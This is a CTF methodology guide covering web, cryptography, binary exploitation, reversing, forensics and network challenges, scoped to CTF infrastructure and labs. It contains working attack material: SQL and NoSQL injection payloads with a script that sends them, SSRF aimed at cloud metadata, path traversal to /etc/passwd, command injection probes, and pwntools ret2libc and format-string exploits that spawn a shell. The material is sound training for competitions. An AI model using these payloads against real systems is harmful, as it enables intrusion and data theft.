---
title: "CTF Challenge Methodology Guide"
description: "Per-category CTF decision flows on the RICE framework: what to check first, what it tells you, what to try next. Web, crypto, pwn, reverse engineering, forensics, network and misc, plus time-boxing and getting unstuck."
tags:
  - ctf
  - methodology
  - systematic-approach
  - problem-solving
  - strategy
updated: 2026-11-07
---

# 🎯 CTF Challenge Methodology Guide

Systematic approaches for solving different types of CTF challenges

This page is one decision flow among many valid ones: what to check first, what the result tells you, what to try next. Payload lists live in [[CTF_Cheat_Sheets]], installs in the [[CTF_Tools|Tools guide]]. Only attack CTF infrastructure and your own labs, within the event rules; see [[sop-legal-ethics|Legal & Ethics]].

---

## 🔄 Universal CTF Methodology

### The RICE Framework

#### **R**econnaissance (Information Gathering)
- Read challenge description thoroughly
- Identify challenge category and potential approaches
- Download and catalog all provided files
- Note any hints or constraints given

#### **I**nvestigation (Deep Analysis)  
- Analyze files/services using appropriate tools
- Document all findings systematically
- Identify patterns, anomalies, and potential vulnerabilities
- Research similar challenges and techniques

#### **C**onceptualization (Strategy Formation)
- Formulate hypothesis about the solution approach
- Plan step-by-step attack strategy
- Consider alternative approaches
- Estimate time and resource requirements

#### **E**xecution (Solution Implementation)
- Implement planned approach systematically
- Document each step and result
- Iterate based on findings
- Validate solution and capture flag

---

## 🌐 Web Exploitation Methodology

### Phase 1: Reconnaissance
```bash
# Site structure analysis
curl -s http://target.com            # raw source, comments included
wget --spider -r -l 2 http://target.com 2>&1 | grep 'http://'

# Technology identification
whatweb http://target.com
curl -I http://target.com
nmap -sV -p 80,443,8080,8443 target.com

# Directory enumeration (Kali: sudo apt install seclists)
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Also read by hand: page source and comments, `robots.txt`, JS bundles (API routes, keys), cookies, and any `/.git/` exposure.

### Phase 2: Vulnerability Assessment
```bash
# Automated scanning (only if the event rules allow scanners)
nikto -h http://target.com
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t http://target.com
```

Map every input (query/body parameters, headers, cookies, file names, JSON keys), then triage by signal:

| Signal | Likely bug | First check | Next step |
|---|---|---|---|
| SQL error, or the page changes with `'` vs `''` | SQL injection | Boolean pair (`AND 1=1` vs `AND 1=2`), then time delay | `UNION` column count, then extract; or sqlmap (below) |
| Parameter takes a URL, or the server fetches something (webhook, "import from URL", PDF/image renderer) | SSRF | Point it at a listener you control, then `http://127.0.0.1:<port>/` | Internal services; cloud metadata at `169.254.169.254` (AWS IMDSv1 is a plain GET; IMDSv2 needs a PUT token, GCP a `Metadata-Flavor: Google` header); other schemes (`file://`, `gopher://`) depending on the fetcher |
| Input echoed back in a page, email or PDF | SSTI | Fuzz `${{<%[%'"}}%\` for an error, then `{{7*7}}` / `${7*7}` for `49` | Identify the engine: `{{7*'7'}}` gives `49` in Twig, `7777777` in Jinja2; error messages often name it. Then the engine's payloads |
| `eyJ...` token in a cookie or `Authorization` header | JWT | Decode the header: which `alg`? Try `alg: none` with an empty signature | HS256: crack the secret (`hashcat -m 16500`). RS256: try alg confusion (re-sign as HS256 with the public key as the secret). Check `kid` / `jku` |
| Blob starting `rO0AB` (base64) / `aced0005` (hex), `O:4:"User":...`, or `gASV` / `gAWV` (base64) | Insecure deserialization (Java, PHP, Python pickle protocol 4/5) | Does modifying a field change behaviour? | Pickle: a `__reduce__` payload. PHP: magic methods / POP chain (phpggc). Java: gadget chain for the libraries in use (ysoserial) |
| JSON login, MongoDB errors, Node/Express stack | NoSQL injection | `{"username":"admin","password":{"$ne":null}}`, or `password[$ne]=x` form-encoded | `$regex` to extract a secret one character at a time |
| Node app merging user JSON into objects | Prototype pollution | Send `{"__proto__":{"polluted":1}}` (or `constructor.prototype`) and look for the property elsewhere | Find a gadget: a property read later (`isAdmin`, template or spawn options) |
| Upload form | File upload | Which checks: extension, `Content-Type`, magic bytes? Where is the file stored and is it served? | Alternate extensions, magic-byte polyglots, `.htaccess`, `../` in the filename, SVG/HTML for XSS |
| `../` or a file name in a parameter | Path traversal / LFI | `../../../../etc/passwd`, then encoded variants | Read source and config; on PHP try `php://filter` |
| Input reaches a shell (ping, DNS lookup, converters) | Command injection | `;id`, `$(id)`, a time delay | Blind? Exfiltrate out-of-band or via sleep timing |

Payloads for every row: [[CTF_Cheat_Sheets]]. Deeper coverage: [[sop-web-application-security|Web Application Security SOP]], cloud metadata in [[sop-cloud-pentest|Cloud Pentest SOP]].

### Phase 3: Exploitation Development
```python
# Example SQL injection testing
import requests

url = "http://target.com/login"
payloads = [
    "admin'--",
    "admin' OR '1'='1'--", 
    "' UNION SELECT 1,2,3--",
    "'; WAITFOR DELAY '00:00:05'--"
]

for payload in payloads:
    data = {"username": payload, "password": "test"}
    response = requests.post(url, data=data)
    if "welcome" in response.text.lower() or response.elapsed.total_seconds() > 5:
        print(f"Potential vulnerability with payload: {payload}")
```

**When to reach for sqlmap:** after you have confirmed an injection point by hand and extraction would be tedious (blind, many tables). Save the request from Burp so cookies and headers come along. Raise `--level` / `--risk` only when the defaults miss. It won't see second-order or custom-encoded injections without help, and some events ban automated tools.

```bash
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D app -T users --dump
```

---

## 🔐 Cryptography Methodology

### Phase 1: Cipher Identification

| What you see | Family | Go to |
|---|---|---|
| `A-Za-z0-9+/=`, length a multiple of 4 | Base64 (an encoding, not a cipher) | Phase 2 |
| `0-9a-f` only, even length | Hex | Phase 2 |
| Letters only, spaces and punctuation preserved | Classical (Caesar, Vigenère, substitution) | Phases 2–3 |
| Large integers `n`, `e`, `c`, or a PEM key | RSA | Phase 4 |
| Random-looking bytes, length a multiple of 16 | Block cipher (AES) | Phase 5 |
| Short repeating key, or a known flag prefix | XOR | Phase 5 |
| Curve parameters, points | ECC | Phase 5 |

### Phase 2: Systematic Decryption Attempts
```python
import base64

COMMON = set('ETAOINSHRDLU ')

def caesar_decrypt(text, shift):
    out = []
    for ch in text:
        if ch.isalpha():
            base = ord('A') if ch.isupper() else ord('a')
            out.append(chr((ord(ch) - base - shift) % 26 + base))
        else:
            out.append(ch)
    return ''.join(out)

def english_score(text):
    """Share of characters that are common English letters or spaces."""
    return sum(c in COMMON for c in text.upper()) / max(len(text), 1)

def try_common_ciphers(ciphertext):
    # ROT13 is shift 13 (one-off: codecs.encode(s, 'rot13'))
    results = {f'caesar_{s}': caesar_decrypt(ciphertext, s) for s in range(26)}
    for name, decode in (('base64', base64.b64decode), ('hex', bytes.fromhex)):
        try:
            results[name] = decode(ciphertext).decode()
        except ValueError:  # covers binascii.Error and UnicodeDecodeError
            pass
    return sorted(results.items(), key=lambda kv: english_score(kv[1]), reverse=True)

for name, text in try_common_ciphers('Wkh iodj lv kdfnhg')[:3]:
    print(name, text)   # caesar_3 The flag is hacked
```

Layered encodings (base64 → hex → ROT13 ...) are faster in CyberChef's "Magic" operation than in code.

### Phase 3: Substitution and Vigenère
- **Monoalphabetic substitution:** match letter frequencies (E, T, A, O, I, N lead in English) and word patterns (`the`, `and`, doubled letters); solve by hand or with a substitution solver.
- **Vigenère:** find the key length first (repeated trigrams / Kasiski, index of coincidence); each column is then a Caesar shift you can rank with the scorer above.

### Phase 4: RSA Triage

Work down the list; the first match is usually the intended bug.

- [ ] **`n` already factored?** Paste it into [factordb](https://factordb.com/). Small `n` (under ~256 bits): factor it yourself (SageMath `factor(n)`).
- [ ] **Small `e` (3) and no padding?** If `m**e < n`, then `c` is just `m**e`: take the integer e-th root.
- [ ] **Same `m` sent to `e` receivers with different `n`?** Håstad: CRT the ciphertexts, then the integer e-th root.
- [ ] **Several moduli?** `gcd(n1, n2) > 1` means a shared prime.
- [ ] **`p` and `q` close together?** Fermat factorisation.
- [ ] **Huge `e` (close to `n`)?** Small `d`: Wiener's attack.
- [ ] **Same `n`, two coprime `e`, same `m`?** Common-modulus: find `s1*e1 + s2*e2 = 1`, then `m = c1^s1 * c2^s2 mod n`.
- [ ] **Leaked bits of `p` or `d`, or a stereotyped message?** Coppersmith-style attacks (SageMath, or RsaCtfTool's lattice attacks).

```python
from math import gcd, isqrt

def iroot(x, k):
    """Largest r with r**k <= x (exact for huge ints, unlike x ** (1/k))."""
    lo, hi = 0, 1 << (x.bit_length() // k + 1)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if mid ** k <= x:
            lo = mid
        else:
            hi = mid - 1
    return lo

def fermat(n, steps=1_000_000):
    """Factor n quickly when p and q are close."""
    a = isqrt(n)
    if a * a < n:
        a += 1
    for _ in range(steps):
        b = isqrt(a * a - n)
        if b * b == a * a - n:
            return a - b, a + b
        a += 1

def crt(rems, mods):
    N = 1
    for m in mods:
        N *= m
    return sum(r * (N // m) * pow(N // m, -1, m) for r, m in zip(rems, mods)) % N

def decrypt(c, e, p, q):
    m = pow(c, pow(e, -1, (p - 1) * (q - 1)), p * q)
    return m.to_bytes((m.bit_length() + 7) // 8, 'big')

# small e, no padding:  m = iroot(c, 3)
# Håstad (e = 3):        m = iroot(crt([c1, c2, c3], [n1, n2, n3]), 3)
# shared prime:          p = gcd(n1, n2); q = n1 // p
# close primes:          p, q = fermat(n)
```

```bash
RsaCtfTool --publickey key.pub --private                  # tries its attacks, prints the private key
RsaCtfTool --publickey key.pub --decryptfile ciphertext
RsaCtfTool --publickey key.pub --attack wiener
```

### Phase 5: Symmetric, XOR and ECC

- **AES-ECB:** identical plaintext blocks give identical ciphertext blocks. Repeated 16-byte blocks mean ECB; if you control part of the plaintext, think byte-at-a-time decryption or block cut-and-paste.
- **CBC padding oracle:** the service decrypts ciphertext you send and answers differently for bad padding than for other errors (message, status code, timing). That difference lets you decrypt any block in at most 256 guesses per byte. Forged-IV bit flips also let you edit the first plaintext block.
- **XOR:** a known flag prefix (`flag{`) XORed with the ciphertext gives the first key bytes. A repeating key falls to the same trick plus key-length guessing.
- **ECC:** check the curve before the maths. Small or smooth order points to Pohlig–Hellman (SageMath `discrete_log`); singular or anomalous curves have known shortcuts; a reused ECDSA nonce leaks the private key.

```python
from itertools import cycle

def xor(data, key):
    return bytes(a ^ b for a, b in zip(data, cycle(key)))

def repeated_blocks(ct, bs=16):
    blocks = [ct[i:i + bs] for i in range(0, len(ct), bs)]
    return len(blocks) - len(set(blocks))   # > 0 → ECB is likely

# key_start = xor(ct[:5], b'flag{')
```

**Tools:** RsaCtfTool, [factordb](https://factordb.com/), SageMath, [CyberChef](https://gchq.github.io/CyberChef/). Install lines in [[CTF_Tools|Tools guide]]; deeper theory in the [[sop-cryptography-analysis|Cryptography Analysis SOP]].

---

## 💾 Binary Exploitation Methodology

### Phase 1: Static Analysis
```bash
# File information gathering
file binary_challenge
strings binary_challenge | grep -E "(flag|password|key)"
objdump -d binary_challenge | head -50
readelf -h binary_challenge

# Security mitigations check
pwn checksec binary_challenge
```

What the mitigations tell you:

| Mitigation | Off / weak | On / strong |
|---|---|---|
| Stack canary | Overflow straight into the return address | Leak the canary first (format string, partial read) |
| NX | Shellcode on the stack works | ROP / ret2libc |
| PIE | Binary addresses are fixed | Leak a code address, then compute the base |
| RELRO | Partial: GOT entries are writable targets | Full: GOT read-only; aim at return addresses or other function pointers |

### Phase 2: Dynamic Analysis
```bash
# Crash test
python3 -c "print('A' * 100)" | ./binary_challenge
python3 -c "print('A' * 200)" | ./binary_challenge

# De Bruijn pattern to find the offset (pwntools CLI)
pwn cyclic 200 > pattern.txt
```

```text
$ gdb ./binary_challenge
(gdb) info functions
(gdb) disas main
(gdb) run < pattern.txt
# x86-64 faults on `ret`, so read the saved return address at the top of the stack:
(gdb) x/wx $rsp
0x7fffffffd248:	0x61616173
$ pwn cyclic -l 0x61616173
72
```

In a script: `cyclic(200)` / `cyclic_find(0x61616173)`. Write pattern bytes with `sys.stdout.buffer.write(cyclic(200))`; `print(cyclic(200))` prints the `b'...'` repr, not the pattern.

### Phase 3: Choose the Technique

- **A `win()` / `print_flag()` function exists** → ret2win: overwrite the return address with it.
- **NX on, no win function** → ret2libc: leak a libc address (e.g. `puts@GOT`), identify the libc, call `system("/bin/sh")` or a one_gadget.
- **`printf(user_input)`** → format string: leak with `%p`, find your offset, then write with `%n` (GOT entry, return address).
- **malloc/free menu (create/edit/delete/show)** → heap. Out of scope here; check the glibc version first, then see [[sop-vulnerability-research#Heap Exploitation|Vulnerability Research SOP: Heap Exploitation]] and [how2heap](https://github.com/shellphish/how2heap).
- **`execve` blocked / shell gets killed** → seccomp: dump the filter, then build an open/read/write chain for the flag file.

> **x86-64 stack alignment:** glibc's `system()` and `printf()` can crash on a `movaps` instruction when the stack is not 16-byte aligned at the call. If the chain is right but it segfaults inside `system`, add one extra `ret` gadget before the function address.

### Phase 4: Exploit Development

```python
# ret2win (no PIE, no canary)
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
offset = 72                                   # from pwn cyclic -l
ret = ROP(elf).find_gadget(['ret']).address   # stack alignment for system()

io = process(elf.path)                        # remote('host', port) for the real target
io.sendline(flat({offset: [ret, elf.symbols['win']]}))
io.interactive()
```

```python
# ret2libc in two stages: leak puts, then system("/bin/sh")
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)     # the libc shipped with the challenge
offset = 72

io = process(elf.path)
io.recvline()                                  # banner

rop = ROP(elf)                                 # needs a `pop rdi; ret` gadget in the binary
rop.puts(elf.got['puts'])
rop.main()                                     # come back for a second payload
io.sendline(flat({offset: rop.chain()}))
leak = u64(io.recvline().rstrip(b'\n').ljust(8, b'\0'))
libc.address = leak - libc.symbols['puts']
log.info(f'libc base {libc.address:#x}')       # should end in 000

io.recvline()
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']).address)      # alignment
rop.system(next(libc.search(b'/bin/sh\0')))
io.sendline(flat({offset: rop.chain()}))
io.interactive()
```

```python
# Format string: find the offset with AAAAAAAA.%6$p.%7$p..., then write
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
offset = 6                                     # where 0x4141414141414141 appeared
io = process(elf.path)
io.send(fmtstr_payload(offset, {elf.got['exit']: elf.symbols['win']}))   # needs Partial RELRO
io.interactive()
```

### Libc Matching, Gadgets and Sandboxes
```bash
# Run the binary against the challenge's libc (finds bin/libc/ld, fetches the loader, patchelfs, writes solve.py)
pwninit
# manual equivalent
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./chall

# No libc provided: identify it from leaked addresses (the last 3 hex digits survive ASLR); or search libc.rip
pwn libcdb lookup puts 6aa printf 100 -d    # example values: symbol, low 3 hex digits; -d downloads the match

# Gadgets
ROPgadget --binary ./chall --only "pop|ret"
ropper --file ./chall --search "pop rdi"
one_gadget ./libc.so.6            # single-address execve gadgets; check the listed constraints

# Seccomp filter (runs the binary)
seccomp-tools dump ./chall
```

---

## 🧩 Reverse Engineering Methodology

### Phase 1: Triage
```bash
file crackme
strings -n 6 crackme | grep -iE 'flag|correct|wrong|key|password'
pwn checksec crackme
```

Stripped? Packed (UPX strings, very few imports)? Language (Go, Rust and .NET each need their own tooling)? A flag in `strings` is sometimes the whole challenge.

### Phase 2: Static (Ghidra)
- Find `main`: in a stripped binary it is the first argument passed to `__libc_start_main` from `entry`.
- Search strings for "Correct" / "Wrong", follow the cross-reference, and read the comparison just before the branch.
- Rename variables and retype buffers as you go; the decompiler output becomes readable fast.
- Classify the check: compare against a constant, a reversible transform (XOR, add, table lookup), or coupled constraints.

### Phase 3: Dynamic
```bash
ltrace ./crackme          # strcmp/memcmp arguments often show the expected input
strace -f ./crackme       # file, network and ptrace syscalls
```

```text
(gdb) break strcmp
(gdb) run
(gdb) x/s $rdi            # first argument (x86-64 System V)
(gdb) x/s $rsi            # second argument
(gdb) finish
(gdb) set $rax = 0        # force the "equal" result and watch the path
```

### Phase 4: Solve
- **Constant compare** → read it from memory or the decompiler.
- **Reversible transform** → reimplement it in Python and run it backwards.
- **Coupled constraints** → z3: transcribe the checks, let the solver find the input.
- **Many branches / heavy obfuscation** → angr: symbolic execution with a `find` address (success message) and `avoid` addresses (failure).
- **Patching** a jump confirms the path, but the flag is usually derived from the input, so you still need the input.

```python
from z3 import BitVec, Solver, sat

# Checks transcribed from the decompiler: pw[0] == 'z', pw[i] + pw[i+1] == SUMS[i]
SUMS = [173, 146, 197, 218, 235, 152]
pw = [BitVec(f'c{i}', 8) for i in range(len(SUMS) + 1)]
s = Solver()
s.add(pw[0] == ord('z'))
s.add([pw[i] + pw[i + 1] == SUMS[i] for i in range(len(SUMS))])
s.add([c >= 0x20 for c in pw] + [c <= 0x7e for c in pw])   # printable
if s.check() == sat:
    model = s.model()
    print(bytes(model[c].as_long() for c in pw))           # b'z3_ftw!'
```

### Anti-Debugging Notes
- `ptrace(PTRACE_TRACEME)` returning -1 means a debugger is attached: patch the check, or break after the call and set `$rax` to 0.
- Reads of `/proc/self/status` (`TracerPid`) and timing checks (`rdtsc`, `clock_gettime`) are the other common tells.
- Code that checksums itself detects software breakpoints (`int3`); use hardware breakpoints (`hbreak`).

More: [[sop-reverse-engineering#Bypassing Anti-Debugging|Reverse Engineering SOP: Bypassing Anti-Debugging]]. Worked example: [[Sample_RevEng_Crackme_Writeup]].

---

## 🕵️ Forensics Methodology

### Phase 1: File Analysis
```bash
# Initial file examination
file evidence.img
hexdump -C evidence.img | head -20
strings evidence.img | grep -i flag

# Metadata and embedded files
exiftool evidence.jpg
binwalk evidence.bin               # signature scan
binwalk -e evidence.bin            # extract into _evidence.bin.extracted/
binwalk -Me evidence.bin           # recursive extraction
foremost -i evidence.dd -o output/
```

The `binwalk` package is v2.x (2.4.3 Debian/Kali, 2.3.4 Ubuntu 24.04). The Rust rewrite (v3) is a separate Kali package and command, `binwalk3`: `-e` and `-M` still work, but extractions land in `extractions/<file>.extracted/` and the output-directory flag is `-d` (v2: `-C`).

### Phase 2: Disk Images and Data Recovery
```bash
# Partition layout: note each partition's start sector
mmls disk.img

# List files (-o = start sector); -d shows deleted entries only
fls -o 2048 -r -p disk.img
fls -o 2048 -r -d disk.img

# Recover a file by inode
icat -o 2048 disk.img 1234 > recovered.bin

# Carving when the filesystem is damaged
testdisk disk.img
photorec disk.img
```

Autopsy gives the same Sleuth Kit view in a GUI (timeline, keyword search, deleted files).

### Phase 3: Memory Analysis (Volatility 3)
```bash
# Windows: symbols are downloaded from Microsoft's symbol server on first run
vol -f mem.dmp windows.info
vol -f mem.dmp windows.pslist
vol -f mem.dmp windows.pstree
vol -f mem.dmp windows.cmdline
vol -f mem.dmp windows.filescan | grep -i flag
mkdir -p dumped                    # -o must already exist
vol -f mem.dmp -o dumped windows.dumpfiles --virtaddr "$OFFSET"   # Offset column from filescan

# Linux: identify the kernel, then supply a matching ISF (dwarf2json or a prebuilt pack) under ./symbols/linux/
vol -f mem.lime banners.Banners
vol -f mem.lime -s ./symbols linux.pslist
vol -f mem.lime -s ./symbols linux.pstree
vol -f mem.lime -s ./symbols linux.bash
```

Volatility 3 has no `imageinfo` or `--profile`; the OS layer is detected automatically. If `--virtaddr` dumps nothing, retry the same offset with `--physaddr`. Linux ISF banners must match the dump's kernel exactly.

### Phase 4: Steganography
- **PNG / BMP:** LSB hiding works because the format is lossless. Run `zsteg -a` first, then `zsteg -E <payload> image.png` to extract what it finds.
- **JPEG:** pixel LSBs do not survive JPEG compression; hiding happens in the DCT coefficients (steghide, outguess). `stegseek` cracks a steghide passphrase from a wordlist; `--seed` detects steghide data without one.
- **Audio:** look at the spectrogram (Audacity, Sonic Visualiser), then sample LSBs.
- **Anything:** appended data after the end-of-file marker (`binwalk`), metadata (`exiftool`), bit planes (StegSolve).

```bash
zsteg -a image.png
zsteg -E b1,r,lsb,xy image.png > out.bin
steghide extract -sf image.jpg
stegseek image.jpg wordlist.txt
stegseek --seed image.jpg
```

```python
# LSB extraction for PNG/BMP and 16-bit WAV
import wave
import numpy as np
from PIL import Image

def extract_lsb(image_path, channel=0):
    """LSB plane of one channel (0=R, 1=G, 2=B), row-major, MSB-first bytes."""
    data = np.array(Image.open(image_path).convert('RGB'))  # palette/greyscale safe
    return np.packbits(data[:, :, channel].flatten() & 1).tobytes()

def extract_wav_lsb(wav_path):
    """LSB of each 16-bit PCM sample, packed into bytes."""
    with wave.open(wav_path, 'rb') as wav:
        assert wav.getsampwidth() == 2, 'expects 16-bit PCM'
        samples = np.frombuffer(wav.readframes(wav.getnframes()), dtype='<i2')
    return np.packbits(samples & 1).tobytes()

print(extract_lsb('image.png')[:64])
```

### Phase 5: Android APKs
```bash
apktool d app.apk -o app_src      # resources, AndroidManifest.xml, smali
jadx -d app_java app.apk          # decompiled Java
grep -rn "flag{" app_src app_java
```

Check `res/values/strings.xml`, the manifest (exported components, debuggable flag) and native libraries in `lib/`. More in the [[sop-mobile-security|Mobile Security SOP]]; general method in the [[sop-forensics-investigation|Forensics Investigation SOP]].

---

## 📡 Network Analysis Methodology

### Phase 1: Traffic Overview
```bash
# Wireshark command line analysis
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri

# Protocol distribution
tshark -r capture.pcap -q -z io,phs
```

### Phase 2: Specific Protocol Analysis
```bash
# HTTP traffic analysis
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data

# DNS analysis (long or odd subdomains = possible exfiltration)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e dns.resp.name -e dns.a

# TCP stream following
tshark -r capture.pcap -q -z follow,tcp,ascii,0
```

### Phase 3: Data Extraction
```bash
# Export transferred files (also: smb, ftp-data, tftp, imf, dicom)
mkdir -p http_objects
tshark -r capture.pcap --export-objects http,http_objects

# TLS: if the challenge ships a key log file, decrypt with it
tshark -r capture.pcap -o tls.keylog_file:keys.log -Y http
```

Then run `file` over the exported objects; flags often sit in an uploaded archive or image.

---

## 🔧 Miscellaneous Challenge Methodology

### Programming Challenges
- Pin down the exact input/output format from the examples before writing code.
- Find the pattern or algorithm; test against the given examples.
- Timed "answer N questions" services: script the socket loop (pwntools `remote`) rather than typing.

```python
# Common patterns
def fibonacci(n):
    if n <= 1: return n
    a, b = 0, 1
    for _ in range(2, n + 1):
        a, b = b, a + b
    return b

def prime_factors(n):
    factors = []
    d = 2
    while d * d <= n:
        while n % d == 0:
            factors.append(d)
            n //= d
        d += 1
    if n > 1:
        factors.append(n)
    return factors
```

### OSINT Challenges
- **Passive recon:** Google dorking, social media, public records, domain/IP lookups.
- **Images:** reverse image search, EXIF, geolocation from landmarks, signs and shadows.
- **Correlation:** cross-reference findings, build a timeline, verify each link before relying on it.

```text
site:target.com filetype:pdf
intext:"target" filetype:xlsx
"target.com" inurl:admin
```

Google retired the `cache:` operator in 2024; use the Wayback Machine (`https://web.archive.org/web/*/target.com`) for old versions of a page. Image work: [[sop-image-video-osint|Image & Video OSINT SOP]].

### Newer Categories
First moves for categories outside the classic six; each links the vault SOP that goes deeper.

| Category | First moves | Go deeper |
|---|---|---|
| AI / LLM | Map what the model can see and call (system prompt, tools, retrieved documents) before attacking; change one thing per attempt and log what moved it | [[sop-ai-vulnerability-evasion-guide\|AI Red-Team Field Guide]] |
| Blockchain / Web3 | Read the contract and the exact win condition the challenge checks; reproduce the attack locally first (Foundry `forge test`) before sending transactions | [[sop-smart-contract-audit\|Smart Contract Audit]] |
| Cloud | Find out who you are and what you can read (`aws sts get-caller-identity`), then enumerate storage and IAM from that identity | [[sop-cloud-pentest\|Cloud Pentest]] |
| Hardware / RF | Identify the file first: firmware → `binwalk` (see Forensics above); radio capture → inspect it in Inspectrum or Universal Radio Hacker | [[sop-wireless-rf-pentest\|Wireless & RF]], [[sop-firmware-reverse-engineering\|Firmware RE]] |
| Mobile | Decompile and grep, as in Forensics → Phase 5 above (`apktool`, `jadx`) | [[sop-mobile-security\|Mobile Security]] |

---

## ⏱️ Time Management in Challenges

### Decision Points
Set a time box per challenge, then check in:
- **25%** → clear direction
- **50%** → no working approach yet: ask for help or pivot
- **75%** → stop and pivot unless nearly solved
- **90%** → finish only, no new approaches

---

## 🧠 Cognitive Approaches

### When You're Stuck

#### The No-New-Information Rule
If 15–20 minutes pass without learning anything new (no new output, error or file), stop and run this list before the next decision point:
1. **Step back**: Read challenge description again
2. **Ask differently**: Rephrase the problem
3. **Change tool**: Try different analysis method
4. **Seek help**: Ask teammate or community
5. **Take break**: Sometimes fresh eyes help

#### Systematic Elimination
```markdown
ELIMINATION CHECKLIST
□ Confirmed file type and format
□ Tried obvious/common solutions
□ Checked for hidden or encoded data
□ Verified tools are working correctly
□ Researched similar challenge types
□ Asked for hints or help
□ Considered alternative approaches
□ Documented what DOESN'T work
```

### Pattern Recognition Development
- **Keep a success journal**: Record successful techniques
- **Study writeups**: Learn from others' approaches
- **Practice regularly**: Build intuition through repetition
- **Cross-category learning**: Techniques often transfer

---

## 📚 Challenge Documentation Template

### During Challenge
```markdown
## Challenge: [Name]
**Start time**: [timestamp]
**Category**: [category]
**Points**: [points]

### Initial Analysis
- File type: 
- Key observations:
- Initial hypothesis:

### Approaches Tried
1. **Approach 1**: [description]
   - Result: [what happened]
   - Time spent: [duration]
   - Next: [what to try next]

2. **Approach 2**: [description]
   - Result: [what happened]
   - Time spent: [duration]
   - Next: [what to try next]

### Breakthrough Moment
- What worked:
- Why it worked:
- How I found it:

### Solution
- Final approach:
- Flag: `flag{...}`
- Total time: [duration]
```

---

*Practice makes perfect - methodology makes practice efficient!*

---

**Last Updated:** 2026-11-07
